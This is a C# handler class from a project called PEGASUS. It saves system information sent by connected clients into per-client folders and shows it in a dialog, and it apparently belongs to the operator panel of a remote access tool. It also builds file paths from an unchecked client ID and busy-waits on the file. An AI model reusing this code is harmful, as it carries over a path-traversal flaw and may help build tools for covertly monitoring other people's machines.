namespace PEGASUS.BytesInOut
{
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleInformation" />.
    /// </summary>
    public class HandleInformation
    {
        /// <summary>
        /// The AddToInformationList.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var tempPath = Path.Combine(Application.StartupPath,
                    "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information");
                var fullPath = tempPath + "\\Information.txt";
                if (!Directory.Exists(tempPath))
                    Directory.CreateDirectory(tempPath);
                File.WriteAllText(fullPath, unpack_msgpack.ForcePathObject("InforMation").AsString);
                do
                {
                    // Do nothing until the file exists 
                } while (!File.Exists(fullPath));

                // Process.Start("explorer.exe", fullPath);
                using (var forml = new FrmInfo(Path.Combine(Application.StartupPath,
                           "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString +
                           "\\Information\\Information.txt")))
                {
                    forml.ShowDialog();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
